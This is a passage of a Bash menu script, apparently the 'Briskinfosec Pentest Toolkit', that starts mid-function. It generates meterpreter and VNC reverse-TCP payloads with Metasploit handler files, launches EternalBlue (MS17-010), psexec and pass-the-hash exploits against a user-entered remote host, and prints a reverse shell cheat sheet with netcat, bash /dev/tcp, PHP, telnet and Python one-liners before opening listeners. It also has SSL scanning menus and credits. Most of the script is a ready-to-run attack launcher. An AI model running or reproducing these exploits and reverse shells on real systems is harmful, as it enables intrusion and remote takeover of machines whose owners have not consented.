				echo -e $yellow"To RUN RC FILE, run using the command msfconsole -r $outfile.rc"$white	
				echo
			elif test $pyld == '5'
				then
				echo 
				echo -ne $okegreen " What is your LHOST (Your IP is = $red $bold $ip $okegreen ): " ; tput sgr0
 				read lhost
				echo				
				echo -ne $okegreen " What is your LPORT: " ; tput sgr0
				read lport
				echo 
				echo -ne $okegreen " Enter the ouput file name (without extension): " ; tput sgr0
				read outfile
				echo
				payload=windows/vncinject/reverse_tcp
				$xtermpay -p windows/vncinject/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o output/$outfile.exe 
				echo -e $okegreen " $outfile.exe has been created and found in OUTPUT folder " 
				echo 
				echo -e "####################################################### "
				echo -e "	            CREATING LISTENER FILE               " 
				echo -e "########################################################"$white
				touch handler/$outfile.rc
				echo use exploit/multi/handler >> handler/$outfile.rc
				echo set PAYLOAD $payload >> handler/$outfile.rc
				echo set LHOST $lhost >> handler/$outfile.rc
				echo set LPORT $lport >> handler/$outfile.rc
				echo set ExitOnSession false >> handler/$outfile.rc
				echo exploit -j >> handler/$outfile.rc
				echo
				echo -e $yellow"RC file has been Created : handler/$outfile.rc "$white
				echo 
				echo -e $yellow"To RUN RC FILE, run using the command msfconsole -r $outfile.rc"$white	
				echo
			elif test $pyld == '6'
				then
				echo 
				echo -ne $okegreen " What is your LHOST (Your IP is = $red $bold $ip $okegreen ): " ; tput sgr0
 				read lhost
				echo				
				echo -ne $okegreen " What is your LPORT: " ; tput sgr0
				read lport
				echo 
				echo -ne $okegreen " Enter the ouput file name (without extension): " ; tput sgr0
				read outfile
				echo
				payload=php/meterpreter/reverse_tcp
				$xtermpay -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o output/$outfile.exe 
				echo -e $okegreen " $outfile.exe has been created and found in OUTPUT folder " 
				echo 
				echo -e "####################################################### "
				echo -e "	            CREATING LISTENER FILE               " 
				echo -e "########################################################"$white
				touch handler/$outfile.rc
				echo use exploit/multi/handler >> handler/$outfile.rc
				echo set PAYLOAD $payload >> handler/$outfile.rc
				echo set LHOST $lhost >> handler/$outfile.rc
				echo set LPORT $lport >> handler/$outfile.rc
				echo set ExitOnSession false >> handler/$outfile.rc
				echo exploit -j >> handler/$outfile.rc
				echo
				echo -e $yellow"RC file has been Created : handler/$outfile.rc "$white
				echo 
				echo -e $yellow"To RUN RC FILE, run using the command  $bold msfconsole -r $outfile.rc"$white	
				echo
			
			elif test $pyld == '7'
          then
           metasploit
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            payload
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            metasploit
        
fi
                       
 
 }

#######################################################
# MSF VULNERABILITY exploit
#######################################################
function msfvuln() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  NETWORK SCANNING $yellow [EXPLOITATION TECH] $red    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                            MSF EXPLOIT                               "
echo -e $okegreen" ====================================================================="                                                     
echo ""
echo ""
  echo -e $white"	[$okegreen"1"$white]$cyan $bold MS17-010 ETERNALBLUE DETECTION"
echo
  echo -e $white"	[$okegreen"2"$white]$cyan $bold MS17-010 ETERNALBLUE EXPLOITATION"
echo
  echo -e $white"	[$okegreen"3"$white]$cyan $bold MS17_010_PSEXEC (POWERSHELL EXECUTION)"
echo
  echo -e $white"	[$okegreen"4"$white]$cyan $bold PASS THE HASH ATTACK "
echo
  echo -e $white"	[$okegreen"5"$white]$cyan $bold BACK"
	echo -e 	" "
  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read pyld
			if test $pyld == '1'
				then
				echo 
				echo -ne $okegreen " What is your RHOST(Remote Host): " ; tput sgr0
 				read rhost
				echo				
				echo
				$xtermeta -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $rhost ; exploit ;exit ;" 
				echo 
				
			elif test $pyld == '2'
				then
				echo 
				echo -ne $okegreen " What is your RHOST(Remote Host): " ; tput sgr0
 				read rhost
				echo -ne $okegreen " What is your LHOST(Your IP is = $red $bold $ip $okegreen): " ; tput sgr0
				read lhost
				echo				
				echo
				$xtermeta -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set lhost $lhost ; set rhost $rhost ; exploit ; "
				echo 
			elif test $pyld == '3'
				then
				echo 
				echo -ne $okegreen " What is your RHOST(Remote Host): " ; tput sgr0
 				read rhost
				echo -ne $okegreen " What is your LHOST(Your IP is = $red $bold $ip $okegreen): " ; tput sgr0
				read lhost
				echo				
				echo
				$xtermeta -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $lhost ; set rhosts $rhost ; exploit ;"
			elif test $pyld == '4'
				then
				echo
				echo -ne $okegreen " What is your RHOST : " ; tput sgr0
				read rhost
				echo
				echo -ne $okegreen " What is your LHOST : " ; tput sgr0
				read lhost
				echo
				echo -ne $okegreen " What is the target ADMIN's Username : " ; tput sgr0
				read smbuser
				echo
				echo -ne $okegreen " Paste the Password Hash Here : " ; tput sgr0
				read smbpass
				echo
				$xtermeta -q -x " use exploit/windows/smb/psexec; set payload windows/meterpreter/reverse_tcp; set lhost $lhost ; set rhost $rhost ; set SMBUser $smbuser ; set SMBPASS $smbpass ; exploit ; "
			elif test $pyld == '5'
          then
           metasploit
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            msfvuln
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            metasploit
        
fi
                       
 
 }

#######################################################
# REVERSE SHELL CHEAT SHEET
#######################################################
function reversesh() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  NETWORK SCANNING $yellow [EXPLOITATION TECH] $red    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                   REVERSE SHELL CHEAT SHEET                          "
echo -e $okegreen" ====================================================================="                                                        
echo ""
echo ""
  echo -e $white"	[$okegreen"1"$white]$cyan $bold NETCAT (UNENCRYPTED)"
echo
  echo -e $white"	[$okegreen"2"$white]$cyan $bold NCAT (ENCRYPTED)"
echo
  echo -e $white"	[$okegreen"3"$white]$cyan $bold BASH"
echo
  echo -e $white"	[$okegreen"4"$white]$cyan $bold PHP"
echo
  echo -e $white"	[$okegreen"5"$white]$cyan $bold TELNET"
echo
  echo -e $white"	[$okegreen"6"$white]$cyan $bold PYTHON"
echo
  echo -e $white"	[$okegreen"7"$white]$cyan $bold BACK"
	echo -e 	" "

  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read pyld
			if test $pyld == '1' #NETCAT
				then
				echo 
				echo -ne $okegreen $bold " What is your IP: " ; tput sgr0
 				read ip
				echo
				echo -ne $okegreen $bold" What is the port you want to listen: " ; tput sgr0
 				read port			
				echo
				echo -n -e $okegreen"  HERE is the REVERSE SHELL for WINDOWS:$red  nc $ip $port -e cmd.exe"
				echo
				echo
				echo -n -e $okegreen"  HERE is the REVERSE SHELL for LINUX:$red  nc $ip $port -e /bin/bash"
				echo
				echo
				echo -n -e $okegreen"  Starting Listerner Now..Please wait.....!!"
			sleep 4
				echo 
				xterm -hold -fa monaco -fs 13 -bg black -e nc -lvp $port
				
			elif test $pyld == '2' #NCAT
				then
				echo 
				echo -ne $okegreen $bold " What is your IP: " ; tput sgr0
 				read ip
				echo
				echo -ne $okegreen $bold" What is the port you want to listen: " ; tput sgr0
 				read port			
				echo
				echo -n -e $okegreen"  HERE is the REVERSE SHELL for WINDOWS:$red  ncat $ip $port --ssl -e cmd.exe -v"
				echo
				echo
				echo -n -e $okegreen"  HERE is the REVERSE SHELL for LINUX:$red  ncat $ip $port --ssl -e /bin/bash -v"
				echo
				echo
				echo -n -e $okegreen"  Starting Listerner Now..Please wait.....!!"
			sleep 4
				echo 
				xterm -hold -fa monaco -fs 13 -bg black -e ncat -l $port --ssl -v
			elif test $pyld == '3' #BASH
				then
				echo 
				echo -ne $okegreen $bold " What is your IP: " ; tput sgr0
 				read ip
				echo
				echo -ne $okegreen $bold" What is the port you want to listen: " ; tput sgr0
 				read port			
				echo
				echo
				echo -n -e $okegreen"  HERE is the REVERSE SHELL for LINUX:$red  0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
				echo
				echo
				echo -n -e $okegreen"  Starting Listerner Now..Please wait.....!!"
			sleep 4
				echo 
				xterm -hold -fa monaco -fs 13 -bg black -e  nc -nvlp $port &
			elif test $pyld == '4' #PHP
				then
				echo 
				echo -ne $okegreen $bold " What is your IP: " ; tput sgr0
 				read ip
				echo
				echo -ne $okegreen $bold" What is the port you want to listen: " ; tput sgr0
 				read port			
				echo
				echo
				echo -n -e $okegreen"  HERE is the REVERSE SHELL:$red  php -r '$sock=fsockopen("$ip",$port);exec("/bin/sh -i <&3 >&3 2>&3");'"
				echo
				echo
				echo -n -e $okegreen $bold $blink "Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)"$nr
				echo
				echo
				echo -n -e $okegreen"  Starting Listerner Now..Please wait.....!!"
			sleep 4
				echo 
				xterm -hold -fa monaco -fs 13 -bg black -e  nc -nvlp $port &
			elif test $pyld == '5' #telnet
				then
				echo 
				echo -ne $okegreen $bold " What is your IP: " ; tput sgr0
 				read ip
				echo
				echo -ne $okegreen $bold" What is the First port you want to listen: " ; tput sgr0
 				read port1
				echo
				echo -ne $okegreen $bold" What is the Second port you want to listen: " ; tput sgr0
 				read port2			
				echo
				echo
				echo -n -e $okegreen $bold"  HERE is the REVERSE SHELL for LINUX:$red  telnet $ip $port1 | /bin/bash | telnet $ip $port2"
				echo
				echo
				echo -n -e $okegreen"  Starting Listerner Now..Please wait.....!!"
			sleep 4
				echo 
				xterm -hold -fa monaco -fs 13 -bg black -e  nc -nvlp $port1 &
			sleep 2
				xterm -hold -fa monaco -fs 14 -bg black -e  nc -nvlp $port2 &
			elif test $pyld == '6' #python
				then
				echo 
				echo -ne $okegreen $bold " What is your IP: " ; tput sgr0
 				read ip
				echo
				echo -ne $okegreen $bold" What is the First port you want to listen: " ; tput sgr0
 				read port			
				echo
				echo
				echo -n -e $okegreen $bold"  HERE is the REVERSE SHELL for LINUX:$red  python -c 'import 		  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
				echo
				echo
				echo -n -e $okegreen"  Starting Listerner Now..Please wait.....!!"
			sleep 4
				echo 
				xterm -hold -fa monaco -fs 13 -bg black -e  nc -nvlp $port &
			elif test $pyld == '7'
          then
           metasploit
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            reversesh
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            metasploit
        
fi
                       
 
 }


#######################################################
# SSL INFORMATION
#######################################################
function sslinfo() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  NETWORK SCANNING  EXPLOITATION TECH  $yellow  [SSL INFO] $red        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                         SSL INFORMATION                              "
echo -e $okegreen" ====================================================================="                                                               
echo ""
  echo -e $white"	[$okegreen"1"$white]$cyan $bold ADVANCE SSL SCAN"
echo ""
  echo -e $white"	[$okegreen"2"$white]$cyan $bold NMAP SSL SCAN"
echo ""
  echo -e $white"	[$okegreen"3"$white]$cyan $bold OPENSSL CERTIFICATE SCAN"
echo ""
  #echo -e $white"	[$okegreen"4"$white]$cyan $bold SSLYZER SCAN"
  echo -e $white"	[$okegreen"4"$white]$cyan $bold BACK"
echo ""
	echo -e 	" "
  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read sslinf
			if test $sslinf == '1'
				then
			        echo
				echo -ne  $okegreen" What is your IP Target: "; tput sgr0
 				read ip
				echo -ne  $okegreen" What is your Port number: "; tput sgr0
				read port				
				xterm -hold -fa monaco -fs 13 -bg black -e ./$testssl_path/testssl.sh $ip:$port  &
			elif test $sslinf == '2'
				then
				echo
				echo -ne "Enter the Target IP: "; tput sgr0
				read ip
				$xtermnmap -Pn -vv -T4 --script=ssl-* $ip
			elif test $sslinf == '3'
				then
				echo -ne  $okegreen" What is your IP Target: "; tput sgr0
 				read ip
				echo -ne  $okegreen" What is your Port number: "; tput sgr0
				read port
				$xtermopen s_client -connect $ip:$port -nbio
			elif test $sslinf == '4'
          then
           menu
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            sslinfo
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            menu
        
fi
                       
 
 }

####################################################
# BANNER function
####################################################
function banner() {
echo
echo -e $okegreen " .----------------.        .----------------.       .----------------.   "
echo -e $okegreen "| .--------------. |      | .--------------. |     | .--------------. |  "
echo -e $okegreen "| |   ______     | |      | |   ______     | |     | |  _________   | |  "
echo -e $okegreen "| |  |_   _ \    | |      | |  |_   __ \   | |     | | |  _   _  |  | |  "
echo -e $okegreen "| |    | |_) |   | |      | |    | |__) |  | |     | | |_/ | | \_|  | |  "
echo -e $okegreen "| |    |  __'.   | |      | |    |  ___/   | |     | |     | |      | |  "
echo -e $okegreen "| |   _| |__) |  | |      | |   _| |_      | |     | |    _| |_     | |  "
echo -e $okegreen "| |  |_______/   | |      | |  |_____|     | |     | |   |_____|    | |  "  
echo -e $okegreen "| |              | |      | |              | |     | |              | |  "
echo -e $okegreen "| '--------------' |      | '--------------' |     | '--------------' |  "
echo -e $okegreen " '----------------'        '----------------'       '----------------'   "
echo -e $white"BRISKINFOSEC PENTEST TOOLKIT - BPT (VERSION 1.0)  WWW.BRISKINFOSEC.COM        "
echo 

}

#######################################################
# CREDITS
#######################################################
function credits {
clear
echo
echo -e $okegreen " .----------------.        .----------------.       .----------------.   "
echo -e $okegreen "| .--------------. |      | .--------------. |     | .--------------. |  "
echo -e $okegreen "| |   ______     | |      | |   ______     | |     | |  _________   | |  "
echo -e $okegreen "| |  |_   _ \    | |      | |  |_   __ \   | |     | | |  _   _  |  | |  "
echo -e $okegreen "| |    | |_) |   | |      | |    | |__) |  | |     | | |_/ | | \_|  | |  "
echo -e $okegreen "| |    |  __'.   | |      | |    |  ___/   | |     | |     | |      | |  "
echo -e $okegreen "| |   _| |__) |  | |      | |   _| |_      | |     | |    _| |_     | |  "
echo -e $okegreen "| |  |_______/   | |      | |  |_____|     | |     | |   |_____|    | |  "  
echo -e $okegreen "| |              | |      | |              | |     | |              | |  "
echo -e $okegreen "| '--------------' |      | '--------------' |     | '--------------' |  "
echo -e $okegreen " '----------------'        '----------------'       '----------------'   "
echo -e $yellow"  BRISKINFOSEC PENTEST TOOLKIT - BPT (VERSION 1.0)  WWW.BRISKINFOSEC.COM        "


echo
echo -e $red "   Copyrights (CC BY-SA 4.0) 2019. All Rights Reserved by Briskinfosec"
echo
echo -e $okegreen $bold "AUTHOR"
echo -e $white "     Venkatesh - Security Engineer, Supported by BRISKINFOSEC BINTLABS"
echo
echo -e  $okegreen $bold "BINT LABS"
echo
echo -e  $white "     BINT LAB (Brisk Intelligence Laboratory) is the indigenous CoE (Center of Excellence) cybersecurity research lab of Briskinfosec."
echo -e  $white "     Here, research and development is focused on making today’s systems more secure while planning for tomorrow’s technology."
echo -e  $white "     Briskinfosec’s unique set of capabilities motivates us to focus on our cybersecurity research in various innovative technologies."
echo -e  $white "     BINT LAB is empowered with in-house experts, volunteers, external security researchers and most talented cybersecurity professionals "
echo -e  $white "      whom possess cult knowledge in the sector of information security."
echo 
echo -e $white "     We have conglomerated a vast library of resources containing Blogs, "
echo -e $white "     Whitepapers and security assessment tools to help in managing and creating smart cybersecurity solutions."
echo 
echo -e $okegreen $bold"     Briskinfosec's BINT LAB achievements:"
echo
echo -e $red "         [✔]$white Briskinfosec BINT LAB won the INDIAN BOOK OF RECORDS for Cybersecurity initiative."
echo -e $red "         [✔]$white ANSE (Advanced N map Scripting Engine) scanner for network security assessment."
echo -e $red "         [✔]$white Created and published NCDRC MAST (National Cyber Defence Research Center Mobile App Security Test) frameworks."
echo -e $red "         [✔]$white Researchers are actively participating in Bug Bounty and Hall of Fame events."
echo
echo -e $okegreen $bold"     Inviting Research Collaboration:"
echo
echo -e $white "     If you are a Individual, University or an Organization looking forward to build or to collaborate on Cybersecurity Research process, "
echo -e $white "     you can send your proposal $yellow contact@briskinfosec.com "
echo
}




####################################################
# MENU
####################################################
function menu(){
clear
echo
echo -e $okegreen " .----------------.        .----------------.       .----------------.   "
echo -e $okegreen "| .--------------. |      | .--------------. |     | .--------------. |  "
echo -e $okegreen "| |   ______     | |      | |   ______     | |     | |  _________   | |  "
echo -e $okegreen "| |  |_   _ \    | |      | |  |_   __ \   | |     | | |  _   _  |  | |  "
echo -e $okegreen "| |    | |_) |   | |      | |    | |__) |  | |     | | |_/ | | \_|  | |  "
echo -e $okegreen "| |    |  __'.   | |      | |    |  ___/   | |     | |     | |      | |  "
echo -e $okegreen "| |   _| |__) |  | |      | |   _| |_      | |     | |    _| |_     | |  "
echo -e $okegreen "| |  |_______/   | |      | |  |_____|     | |     | |   |_____|    | |  "  
echo -e $okegreen "| |              | |      | |              | |     | |              | |  "
echo -e $okegreen "| '--------------' |      | '--------------' |     | '--------------' |  "
echo -e $okegreen " '----------------'        '----------------'       '----------------'   "
echo -e $white"BRISKINFOSEC PENTEST TOOLKIT - BPT (VERSION 1.0)  WWW.BRISKINFOSEC.COM        "
echo 
echo



		echo -e $green"	[$okegreen"1"$green]$cyan $bold INTEL GATHERING  "
		echo ""
		echo -e $green"	[$okegreen"2"$green]$cyan $bold NETWORK SCANNING  "
		echo ""
		echo -e $green"	[$okegreen"3"$green]$cyan $bold EXPLOITATION TECHNIQUES "
		echo ""
		echo -e $green"	[$okegreen"4"$green]$cyan $bold SSL INFORMATION  "
		echo ""
		echo -e $green"	[$okegreen"5"$green]$cyan $bold CREDITS  "
		echo ""
		echo -e $green"	[$okegreen"6"$green]$cyan $bold EXIT  "
		echo -e " "
		echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m '; tput sgr0 #insert your choice
		read brisk
		if test $brisk == '1'
      then
   			intel

		elif test $brisk == '2'
      then
  			network

		elif test $brisk == '3'
      then
        		metasploit


		elif test $brisk == '4'
      then
       			sslinfo

		elif test $brisk == '5'
       then
      			credits

     elif test $brisk == '6'
      then
        clear
				sleep 1
				echo ""
				banner
	echo
	echo
				echo -e $yellow"[*] Thank You For Using Our Tool  =)."
				echo ""
			
        exit

 		else
			echo -e "  Incorrect Number"
			fi
			echo -n -e "  Do you want exit? ( Yes / No ) :"
			read back
			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
					then
					clear
					exit
			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
					then
					menu
fi



}

####################################################
# BANNER
####################################################
clear
echo
echo -e $okegreen " .----------------.        .----------------.       .----------------.   "
echo -e $okegreen "| .--------------. |      | .--------------. |     | .--------------. |  "
echo -e $okegreen "| |   ______     | |      | |   ______     | |     | |  _________   | |  "
echo -e $okegreen "| |  |_   _ \    | |      | |  |_   __ \   | |     | | |  _   _  |  | |  "
echo -e $okegreen "| |    | |_) |   | |      | |    | |__) |  | |     | | |_/ | | \_|  | |  "
echo -e $okegreen "| |    |  __'.   | |      | |    |  ___/   | |     | |     | |      | |  "
echo -e $okegreen "| |   _| |__) |  | |      | |   _| |_      | |     | |    _| |_     | |  "
echo -e $okegreen "| |  |_______/   | |      | |  |_____|     | |     | |   |_____|    | |  "  
echo -e $okegreen "| |              | |      | |              | |     | |              | |  "
echo -e $okegreen "| '--------------' |      | '--------------' |     | '--------------' |  "
echo -e $okegreen " '----------------'        '----------------'       '----------------'   "
echo -e $white"BRISKINFOSEC PENTEST TOOLKIT - BPT (VERSION 1.0)  WWW.BRISKINFOSEC.COM        "
echo

echo 


echo

		echo -e $green"	[$okegreen"1"$green]$cyan $bold INTEL GATHERING  "
		echo ""
		echo -e $green"	[$okegreen"2"$green]$cyan $bold NETWORK SCANNING  "
		echo ""
		echo -e $green"	[$okegreen"3"$green]$cyan $bold EXPLOITATION TECHNIQUES "
		echo ""
		echo -e $green"	[$okegreen"4"$green]$cyan $bold SSL INFORMATION  "
		echo ""
		echo -e $green"	[$okegreen"5"$green]$cyan $bold CREDITS  "
		echo ""
		echo -e $green"	[$okegreen"6"$green]$cyan $bold EXIT  "
		echo -e " "
		echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m '; tput sgr0 #insert your choice
		read brisk
		if test $brisk == '1'
      then
   			intel

		elif test $brisk == '2'
      then
  			network

		elif test $brisk == '3'
      then
        		metasploit


		elif test $brisk == '4'
      then
       			sslinfo

		elif test $brisk == '5'
       then
      			credits

     elif test $brisk == '6'
      then
        clear
				sleep 1
				echo ""
				banner
echo
echo
				echo -e $yellow"[*] Thank You For Using Our Tool  =)."
				echo ""
			
        exit

 		else
			echo -e "  Incorrect Number"
			fi
			echo -n -e "  Do you want exit? ( Yes / No ) :"
			read back
			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
					then
					clear
					exit
			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
					then
					menu
fi



